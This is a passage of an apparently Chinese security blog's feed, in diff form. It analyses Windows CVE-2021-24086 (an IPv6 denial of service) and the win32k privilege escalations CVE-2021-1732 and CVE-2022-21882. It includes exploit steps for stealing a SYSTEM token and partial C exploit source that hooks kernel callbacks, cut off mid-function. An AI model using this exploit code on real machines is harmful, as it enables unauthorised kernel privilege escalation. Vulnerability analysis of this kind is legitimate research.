<span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<p>1.触发越界写入漏洞，修改window对象的cbWndExtra为0xFFFEFFF，使用window对象WndExtra可以访问大内存。</p>
-<p>2.修改另一个窗口的WS_CHILD标志，为另一个窗口设置一个专门构造的Menu(fake menu)</p>
-<p>3.通过GetMenuBarInfo API和假菜单获取任意读取原语。</p>
-<p>4.使用SetWindowLongPtrA API修改另一个窗口对象的ExtraBytes以获得任意写入原语。</p>
-<p>5.通过EPROCESS ActiveProcessLinks找到PID为4的系统eprocess</p>
-<p>6.读取系统token，替换当前进程token</p>
-<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173152485.png"></p>
-<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173215705.png"></p>
-<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173238270.png"></p>
-]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2021-1732 win32K内核提权漏洞分析</title>
     <url>/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>内存破坏类内核提权漏洞一般是由C/C++的不安全操作引发，最常见的是Win32k组件中由于Callback机制导致的UAF漏洞。Windows操作系统设计初期，Win32k子系统是在用户态的，从Windows NT4开始，这部分代码移到了内核态，内核态增加了一个Win32k.sys模块，导致3个不安全的因素1.新的系统调用（1100+syscalls）2.用户模式回调（User-mode Callback）3.用户态和内核态之间的共享数据（Share data）。win32k是微软Windows子系统的图形GUI组件，该组件被用于Windows操作系统桌面的图形打印。由于win32k架构的原因，win32k的内核组件需要通过用户模式回调函数对用户模式下的代码进行调用，方便窗口的创建和管理。Win32k内核函数（如xxxCreateWindowEx）会通过用户进程PEBKernelCallBackTable生成回调函数（如xxxClientAllocWindowClassExtraBytes）,当用户模式回调函数完成后，会执行NtCallbackReturn将预期的返回参数传回内核，由于这些回调函数无状态特性，可以造成许多与对象锁定机制有关的漏洞。Win32k漏洞通常会利用tagWND数据结构的桌面对象，然后借助内核读写原语转化为纯数据攻击。</p>
@@ -2111,6 +1203,858 @@ SetWindowLongPtr(hTargetWnd, TAGWND_BODY_REL_VALUE_OFF, 0);
       </tags>
   </entry>
   <entry>
+    <title>CVE-2021-24086 TCPIP拒绝服务漏洞分析</title>
+    <url>/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h2><p>Windows IPv6协议栈存在的一处拒绝服务漏洞，漏洞的根本原因是IPv6的嵌套分片机制中，当尝试递归重组嵌套的分片时会计算内部有效载荷中包含的所有扩展标头，当重组扩展头约为0xffff字节的数据包时，tcpip!IPv6ReassembleDatagram中发生的NULL指针解引用发生崩溃。</p>
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>漏洞是在tcpip!Ipv6pReassembleDatagram函数中，向rax中写入数据时导致崩溃。</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108162657004.png"></p>
+<h3 id="tcpip-Ipv6pReassembleDatagram"><a href="#tcpip-Ipv6pReassembleDatagram" class="headerlink" title="tcpip!Ipv6pReassembleDatagram"></a>tcpip!Ipv6pReassembleDatagram</h3><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108144319506.png"></p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108150549114.png"></p>
+<h3 id="NdisGetDataBuffer"><a href="#NdisGetDataBuffer" class="headerlink" title="NdisGetDataBuffer"></a>NdisGetDataBuffer</h3><pre class="line-numbers language-none"><code class="language-none">NDIS_EXPORTED_ROUTINE PVOID NdisGetDataBuffer(
+  [in]           NET_BUFFER *NetBuffer,    //指向NET_BUFFER的指针
+  [in]           ULONG      BytesNeeded,   //请求的数据的连续的字节数
+  [in, optional] PVOID      Storage,       //指向缓冲区的指针;如果调用方未提供任何缓冲区，则为 NULL 。 缓冲区的大小必须大于或等于 BytesNeeded 中指定的字节数。 如果此值不是 NULL，并且请求的数据不是连续的，则 NDIS 会将请求的数据复制到 存储 指示的区域。  
+  [in]           ULONG      AlignMultiple, //幂对齐
+  [in]           ULONG      AlignOffset    //对齐倍数的偏移量
+);
+
+NdisGetDataBuffer 返回指向连续数据的开头的指针，或者返回 NULL。
+如果 NetBuffer 参数指向的 NET_BUFFER 结构中NET_BUFFER_DATA结构的 DataLength 成员小于 BytesNeeded 参数中的值，则返回值为 NULL。
+如果缓冲区中请求的数据是连续的，则返回值是指向 NDIS 提供的位置的指针。 如果数据不连续，NDIS 使用 存储 参数，如下所示：
+如果 Storage 参数为非 NULL，则 NDIS 会将数据复制到 存储中的缓冲区。 返回值是传递给 Storage 参数的指针。
+如果 Storage 参数为 NULL，则返回值为 NULL。
+由于无法映射数据缓冲区的低资源条件，返回值也可能为 NULL 。 即使数据连续或存储参数为非 NULL，也可能发生这种情况。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>NdisGetDataBuffer函数返回数据指针或者NULL，rax是NdisGetDataBuffer函数的返回值，当赋值为0，之后赋值数据没有判断是否是空指针，就会导致异常。</p>
+<h3 id="ndis-NdisGetDataBuffer"><a href="#ndis-NdisGetDataBuffer" class="headerlink" title="ndis!NdisGetDataBuffer"></a>ndis!NdisGetDataBuffer</h3><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108152123775.png"></p>
+<p>NetBuffer-&gt;DataLength小于传进来的第二个参数BytesNeeded就会返回0。</p>
+<h3 id="tcpip-NetioRetreatNetBuffer"><a href="#tcpip-NetioRetreatNetBuffer" class="headerlink" title="tcpip!NetioRetreatNetBuffer"></a>tcpip!NetioRetreatNetBuffer</h3><p>在调用ndis!NdisGetDataBuffer之前调用了tcpip!NetioRetreatNetBuffer函数</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109102806617.png"></p>
+<p>函数调用之前，NET_BUFFER-&gt;CurrentMdlOffset还没有设置，会调用NdisRetreatNetBufferDataStart函数设置NET_BUFFER结构。</p>
+<p>NdisRetreatNetBufferDataStart会把NET_BUFFER-&gt;DataLength设置为0x10,函数返回0</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109105241377.png"></p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109105650123.png"></p>
+<p>a2 BytesNeeded是v3+0x28，v3是a2偏移0x68，a2是Ipv6pReceiveFragment函数中由IppCreateInReassemblySet生成，满足条件后才会调用tcpip!Ipv6pReassembleDatagram进行重组。</p>
+<h3 id="Ipv6pReceiveFragment"><a href="#Ipv6pReceiveFragment" class="headerlink" title="Ipv6pReceiveFragment"></a>Ipv6pReceiveFragment</h3><p>Ipv6pReceiveFragment函数作用是处理分片，当最后一个分片校验通过，就会调用tcpip!Ipv6pReassembleDatagram函数进行重组。</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109110612827.png"></p>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>攻击机：kali2022<br>靶机：win10专业版1709（16299.125）</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221107164353456.png"></p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221107164441542.png"></p>
+<p>NdisGetDataBuffer有返回NULL的情况，可以使NET_BUFFER为NULL，NdisGetDataBuffer会返回NULL，就会触发BSOD空指针引用。</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109113544500.png"></p>
+<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>Ipv6pReassembleDatagram增加了判断，当重组数据包options_data_length和fragment_sum_length和大于0xFFFF会调用IppDeleteFromReassmblySet函数删除这个包的信息，跳过重组。</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109140212506.png"></p>
+<p>在NetioRetreaNetBuffer函数调用处将第二个参数长度变成32位，避免后续调用NdisGetDataBuffer参数不一致。</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109140232843.png"></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2022-21882 Win32K本地提权分析</title>
+    <url>/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="0x00漏洞描述"><a href="#0x00漏洞描述" class="headerlink" title="0x00漏洞描述"></a>0x00漏洞描述</h2><p>CVE-2022-21882漏洞是window系统的一个本地提权漏洞，微软在2022年1月份安全更新中修补了此漏洞。CVE-2022-21882是对CVE-2021-1732漏洞的绕过，属于win32k驱动程序中的类型混淆漏洞。漏洞成因与CVE-2021-1732类似，主要因为win32kfull!xxxClientAllocExtraBytes函数会回调用户空间中的user32!xxxClientAllocWindowClassExtraBytes,使用NtUserConsoleControl方法设置tagWNDK对象的ConsoleWindow标志，修改窗口类型。回调之后，系统不检查窗口类型是否改变，攻击者可以设置目标窗口的ExtraBytes指针为任意值，修改寻址方式为桌面堆+偏移，以实现桌面堆的越界写。</p>
+<p>影响版本：</p>
+<pre class="line-numbers language-none"><code class="language-none">Windows 10 Version 21H2 for x64-based Systems
+Windows 10 Version 21H2 for ARM64-based Systems
+Windows 10 Version 21H2 for 32-bit Systems
+Windows 11 for ARM64-based Systems
+Windows 11 for x64-based Systems
+Windows Server, version 20H2 (Server Core Installation)
+Windows 10 Version 20H2 for ARM64-based Systems
+Windows 10 Version 20H2 for 32-bit Systems
+Windows 10 Version 21H1 for ARM64-based Systems
+Windows 10 Version 21H1 for x64-based Systems
+Windows 10 Version 1909 for x64-based Systems
+Windows 10 Version 1909 for 32-bit Systems
+Windows Server 2019 (Server Core installation)
+Windows Server 2019
+Windows 10 Version 1809 for ARM64-based Systems
+Windows 10 Version 1809 for x64-based Systems
+Windows 10 Version 1809 for 32-bit Systems
+Windows 10 Version 20H2 for x64-based Systems
+Windows 10 Version 1909 for ARM64-based Systems
+Windows Server 2022 (Server Core installation)
+Windows Server 2022
+Windows 10 Version 21H1 for 32-bit Systems<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x01漏洞分析"><a href="#0x01漏洞分析" class="headerlink" title="0x01漏洞分析"></a>0x01漏洞分析</h2><h3 id="CVE-2021-1732补丁"><a href="#CVE-2021-1732补丁" class="headerlink" title="CVE-2021-1732补丁"></a>CVE-2021-1732补丁</h3><p>CVE-2021-1732的补丁是在CreateWindowEx在调用ClientAllocWindowClassExtraBytes后增加了一个检查。正常情况下在新创建一个窗口还没有调用xxxClientAllocWindowClassExtraBytes的时候，其窗口对应的tagWND -&gt; ExtraBytes是空的，通过检测目标窗口的ExtraBytes指针是否在回调过程中被修改，推测用户态回调是否被hook，如果检查到非正常修改就会释放新创建的窗口，返回失败。也就是说CVE-2021-1732的补丁打在CreateWindowEx，修复方法是在调用xxxClientAllocWindowClassExtraBytes函数后，在CreateWindowEx中判断漏洞是否被利用。</p>
+<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815112448042.png"></p>
+<p>但是xxxCreateAllocWindowClassExtraBytes函数并没有做任何修改。打完补丁之后，又出现的新的路径来触发xxxClientAllocWindowClassExtraBytes函数。</p>
+<h3 id="win32kfull-xxxSwitchWndProc"><a href="#win32kfull-xxxSwitchWndProc" class="headerlink" title="win32kfull!xxxSwitchWndProc"></a>win32kfull!xxxSwitchWndProc</h3><p>xxxSwitchWndProc函数中调用xxxClientAllocWindowClassExtraBytes为窗口分配额外内存，后面却没有检查窗口的ExtraBytes在用户层回调过程中是否修改，因此发生了和CVE-2021-1732同样的问题，由于窗口已经创建完毕，窗口的句柄也更容易拿到，因此漏洞更容易利用。</p>
+<pre class="line-numbers language-none"><code class="language-none">_int64 __fastcall xxxSwitchWndProc(struct tagWND *a1, int a2, unsigned __int64 a3, __int64 a4)
+{
+    *((_QWORD *)v7 + 0x23) = v15;
+    *(_DWORD *)(*(_QWORD *)v8 + 0xFCi64) = v14;
+    cbExtraBytes = *(unsigned int *)(*(_QWORD *)v8 + 0xC8i64);
+    v28 = cbExtraBytes;
+    if ( (_DWORD)cbExtraBytes )//cbExtraBytes大于0，调用xxxClientAllocWindowClassExtraBytes
+    {
+        ret = (void *)xxxClientAllocWindowClassExtraBytes((unsigned int)cbExtraBytes);
+        if ( !ret )
+            return 0i64;
+    }
+    else
+    {
+        ret = 0i64;
+    }
+    if ( tagWND::RedirectedFieldpExtraBytes::operator&lt;bool&gt; bool((__int64)v7 + 0x140) )// tagWND-&gt;ExtraBytes != NULL
+    {
+        if ( ret )
+            memmove(
+            ret,
+            (const void *)(*(_QWORD *)(*(_QWORD *)v8 + 0x128i64) + *(unsigned int *)(*(_QWORD *)v8 + 0xFCi64)),
+            cbExtraBytes);
+        tagWND = *((_QWORD *)v7 + 5);
+        ExtraBytes = *(_QWORD *)(tagWND + 0x128);
+        *(_QWORD *)(tagWND + 0x128) = ret;
+        *(_DWORD *)(*((_QWORD *)v7 + 5) + 0xC8i64) = cbExtraBytes;
+        xxxClientFreeWindowClassExtraBytes((__int64)v7, ExtraBytes);
+    }
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815162914670.png"></p>
+<p>应用层可以通过调用NtUserMessageCall函数触发内核层的xxxSwitchWndProc函数，接着就会调用到xxxClientAllocWindowClassExtraBytes。事先在应用层hook相应的回调函数，然后调用函数NtUserConsoleControl修改tagWND_Trigger的ExtraBytes内存寻址方式为桌面堆+偏移，调用NtCallbackReturn将窗口相对桌面堆的偏移tagWND_Victim offset设置为tagWND_Trigger - &gt; ExtraBytes，Hook应用层的User32!xxxClientFreeWindowClassExtraBytes,使其不释放tagWND_Trigger -&gt; ExtraBytes。</p>
+<p>触发漏洞窗口hTrigger和受害者窗口hVictim在内存上的布局：按照利用流程修改hTrigger的tagWND-&gt;Flags |= 0x800,设置tagWND_Victim相对与桌面堆的偏移为Trigger-&gt;ExtraBytes,然后对hWndTrigger调用SetWindowLong系列函数，越界修改Victim-&gt;ExtraBytes为任意内存，再对hWndVictim调用SetWindowLong系列函数任意内存写，获得任意内核地址写之后，修改当前进程的Token -&gt; Privileges,最后恢复Victim -&gt; ExtraBytes和Trigger -&gt; Flags，避免BSOD。</p>
+<h3 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h3><pre class="line-numbers language-none"><code class="language-none">##include&lt;windows.h&gt;
+##include&lt;stdio.h&gt;
+##include&lt;stdlib.h&gt;
+##include &lt;Psapi.h&gt;
+##pragma comment(lib, "Psapi.lib ")
+
+##define KERNEL_CALLBACK_TABLE_OFFSET 0x58
+##define TRIGGERWND_EXTRASIZE 0xABCD
+##define STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L) 
+
+##pragma pack(1)
+typedef struct 
+{
+    ULONG64 hWnd;                // + 0x00
+    ULONG64 OffsetToDesktopHeap; // + 0x08
+    ULONG64 state;               // + 0x10
+    DWORD dwExStyle;             // + 0x18
+    DWORD dwStyle;               // + 0x1C
+    BYTE padd1[0xa8];
+    ULONG64 cbWndExtra;          // + 0xC8
+    BYTE padd2[0x18];
+    DWORD dwExtraFlag;           // + 0xE8
+    BYTE padd3[0x3c];
+    ULONG64 pExtraBytes;         // + 0x128
+}tagWNDK,*PWND;
+
+##pragma pack(0)
+
+typedef struct _SYSTEM_HANDLE
+{
+    PVOID Object;
+    HANDLE UniqueProcessId;
+    HANDLE HandleValue;
+    ULONG GrantedAccess;
+    USHORT CreatorBackTraceIndex;
+    USHORT ObjectTypeIndex;
+    ULONG HandleAttributes;
+    ULONG Reserved;
+} SYSTEM_HANDLE, * PSYSTEM_HANDLE;
+
+typedef struct _SYSTEM_HANDLE_INFORMATION_EX
+{
+    ULONG_PTR HandleCount;
+    ULONG_PTR Reserved;
+    SYSTEM_HANDLE Handles[1];
+} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;
+
+enum SYSTEM_INFORMATION_CLASS {
+    SystemExtendedHandleInformation = 64
+};
+
+using NtUserMessageCall_t = NTSTATUS(*)(
+    HWND hWnd,
+    UINT Msg,
+    WPARAM wParam,
+    LPARAM lParam,
+    ULONG_PTR ResultInfo,
+    DWORD dwType,
+    BOOL bAnsi);
+
+using ZwQuerySystemInformation_t = NTSTATUS(*)(
+    SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    PVOID SystemInformation,
+    ULONG SystemInformationLength,
+    PULONG ReturnLength);
+
+using RtlAllocateHeap_t = PVOID(*)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
+
+using xxxClientAllocWindowClassExtraBytes_t = NTSTATUS(*)(PDWORD Length);
+using xxxClientFreeWindowClassExtraBytes_t = NTSTATUS(*WINAPI)(PVOID* pInfo);
+
+using NtUserConsoleControl_t = NTSTATUS(__fastcall*)(DWORD64, LPVOID, DWORD);
+using NtCallbackReturn_t = NTSTATUS(__fastcall*)(LPVOID, DWORD, NTSTATUS);
+using HMValidateHandle_t = tagWNDK*(__fastcall*)(HANDLE, UINT);
+using IsMenu_t = BOOL(*)(HMENU hMenu);
+
+namespace gb {
+    xxxClientAllocWindowClassExtraBytes_t xxxClientAllocWindowClassExtraBytes = 0;
+    xxxClientFreeWindowClassExtraBytes_t xxxClientFreeWindowClassExtraBytes = 0;
+    NtUserConsoleControl_t NtUserConsoleControl = 0;
+    NtCallbackReturn_t NtCallbackReturn = 0;
+    HMValidateHandle_t HMValidateHandle = 0;
+    NtUserMessageCall_t  NtUserMessageCall = 0;
+    ZwQuerySystemInformation_t ZwQuerySystemInformation = 0;
+    RtlAllocateHeap_t RtlAllocateHeap = 0;
+
+    IsMenu_t u32_IsMenu = 0;
+    HMODULE g_hNtdll = 0;
+    HMODULE g_hWin32u = 0;
+    HMODULE g_hUser32 = 0;
+
+    HWND g_hTriggerWnd = 0;
+    HWND g_hVictimWnd = 0;
+
+    DWORD64 TriggerDeskHeap = 0;
+    DWORD64 VictimDeskHeap = 0;
+    HANDLE hToken = 0;
+};
+
+
+VOID SetFuncHook(DWORD64 newAllocFunc,DWORD64 newFreeFunc) {
+    //1.获取本进程的PEB
+    DWORD64 ulCurrPEB = __readgsqword(0x60);
+    printf("[+] Found ulCurrPEB = 0x%p\n", ulCurrPEB);
+    //2.找到KernelCallbackTable
+    DWORD64 KernelCallbackTable = ulCurrPEB + KERNEL_CALLBACK_TABLE_OFFSET;
+    KernelCallbackTable = *(PDWORD64)KernelCallbackTable;
+    printf("[+] Found KernelCallbackTable = 0x%p\n", KernelCallbackTable);
+    DWORD64  xxxClientAllocExtraBytesFunc = *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7B * 8);
+    printf("[+] Found xxxClientAllocExtraBytesFunc = 0x%p\n", xxxClientAllocExtraBytesFunc);
+    gb::xxxClientAllocWindowClassExtraBytes = (xxxClientAllocWindowClassExtraBytes_t)xxxClientAllocExtraBytesFunc;
+
+    DWORD64  xxxClientFreeExtraBytesFunc = *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7C * 8);
+    printf("[+] Found xxxClientFreeExtraBytesFunc = 0x%p\n", xxxClientFreeExtraBytesFunc);
+    gb::xxxClientFreeWindowClassExtraBytes = (xxxClientFreeWindowClassExtraBytes_t)xxxClientFreeExtraBytesFunc;
+
+    //3.HOOK
+    //首先需要设置页面可写属性
+    DWORD dwOldProtect;
+    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7B * 8), 0x300, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);
+    *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7B * 8) = newAllocFunc;
+    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7B * 8), 0x300, dwOldProtect, &amp;dwOldProtect);
+
+    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7C * 8), 0x300, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);
+    *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7C * 8) = newFreeFunc;
+    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7C * 8), 0x300, dwOldProtect, &amp;dwOldProtect);
+}
+
+NTSTATUS WINAPI ClientFreeWindowsClassExtraBytesProxy(PVOID* pInfo) {
+    PWND pwnd = (PWND)pInfo[0];
+    if (pwnd-&gt;cbWndExtra == TRIGGERWND_EXTRASIZE)
+        return 1;
+    return gb::xxxClientFreeWindowClassExtraBytes(pInfo);
+}
+
+NTSTATUS WINAPI ClientAllocatWindowClassExtraBytesProxy(PDWORD size) {
+    
+    if (*size==TRIGGERWND_EXTRASIZE) {
+        //获取窗口句柄
+        //使用NtUserConsoleControl 将目标窗口的寻址模式修改为DesktopHeap+Offset
+        printf("[+] ClientAllocatWindowClassExtraBytesProxy called! Offset = %p\n\n", gb::VictimDeskHeap);
+        gb::NtUserConsoleControl(6, &amp;gb::g_hTriggerWnd, 0x10);
+        //修改hWndTriggle 的 tagWnd-&gt;ExtraBytes 为 hTriggerWnd的桌面堆
+        DWORD64 ulResult = gb::VictimDeskHeap ;
+        return gb::NtCallbackReturn(&amp;ulResult, 24, 0);
+    }
+    return gb::xxxClientAllocWindowClassExtraBytes(size);
+}
+
+LRESULT __fastcall WindowProc(HWND a1, UINT a2, WPARAM a3, LPARAM a4)
+{
+    if (a2 != 2)
+        return DefWindowProcW(a1, a2, a3, a4);
+    PostQuitMessage(0);
+    return 0;
+}
+
+bool CheckPrivilege(HANDLE TokenHandle)
+{
+    BOOL isPrivilegeSet = FALSE;
+    PRIVILEGE_SET       privSet;
+    LUID_AND_ATTRIBUTES Privileges[1];
+    LookupPrivilegeValue(NULL, "SeDebugPrivilege", &amp;(Privileges[0].Luid));
+    Privileges[0].Attributes = 0;
+
+    privSet.PrivilegeCount = 1;
+    privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
+    memcpy(privSet.Privilege, Privileges, sizeof(Privileges));
+
+    PrivilegeCheck(TokenHandle, &amp;privSet, &amp;isPrivilegeSet);
+    return isPrivilegeSet;
+}
+
+DWORD getProcessId(const char* name)
+{
+    DWORD aProcesses[1024], cbNeeded, cProcesses;
+    unsigned int i;
+
+    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &amp;cbNeeded))
+    {
+        printf("[Error_%d] EnumProcess failed...\n", __LINE__);
+        exit(0);
+    }
+
+
+    // Calculate how many process identifiers were returned.
+    cProcesses = cbNeeded / sizeof(DWORD);
+
+    // Print the name and process identifier for each process.
+    for (i = 0; i &lt; cProcesses; i++)
+    {
+        if (aProcesses[i] != 0)
+        {
